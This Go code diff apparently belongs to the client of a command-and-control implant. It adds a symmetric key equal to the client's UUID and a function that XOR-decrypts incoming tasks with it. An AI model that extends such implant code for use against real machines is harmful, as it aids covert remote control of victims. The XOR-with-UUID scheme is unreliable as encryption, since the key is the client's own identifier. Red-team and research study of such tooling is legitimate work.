@@ -37,6 +37,7 @@ type Client struct {
 	Results              []TaskResult    `json:"results"`
 	RsaPrivateKey        *rsa.PrivateKey `json:"-"`
 	RsaPublicKey         *rsa.PublicKey  `json:"public_key"`
+	ClientSideSymKey     []byte          `json:"-"`
 	ListenerType         ListenerType    `json:"listener_type"`
 	Jitter               int             `json:"jitter"`
 	Sleeping             bool            `json:"sleeping"`
@@ -95,21 +96,22 @@ func NewClient() *Client {
 		arch = runtime.GOARCH
 		integrity = basic.GetIntegrity()
 	}
-
+	uuid := GenerateUUID()
 	return &Client{
-		ClientId:     GenerateUUID(),
-		HostName:     hostname,
-		Username:     user.Username,
-		ProcessName:  process,
-		ProcessId:    os.Getpid(),
-		Online:       true,
-		Integrity:    integrity,
-		OS:           osName,
-		Arch:         arch,
-		Jitter:       5, // default
-		ListenerType: 0,
-		Sleeping:     false,
-		PublicIp:     GetPublicIp(),
+		ClientId:         uuid,
+		HostName:         hostname,
+		Username:         user.Username,
+		ProcessName:      process,
+		ProcessId:        os.Getpid(),
+		Online:           true,
+		Integrity:        integrity,
+		OS:               osName,
+		Arch:             arch,
+		Jitter:           5, // default
+		ListenerType:     0,
+		Sleeping:         false,
+		PublicIp:         GetPublicIp(),
+		ClientSideSymKey: []byte(uuid),
 	}
 
 }
@@ -117,6 +119,15 @@ func NewClient() *Client {
 func GenerateUUID() string {
 	id := uuid.New()
 	return id.String()
+}
+
+func (c *Client) DecryptTaskWithSymKey(data []byte) []byte {
+	var output []byte
+	key := c.ClientSideSymKey
+	for i := 0; i < len(data); i++ {
+		output = append(output, data[i]^key[i%len(key)])
+	}
+	return output
 }
 
 func (c *Client) EncryptMessageWithPubKey(data []byte) ([]byte, error) {
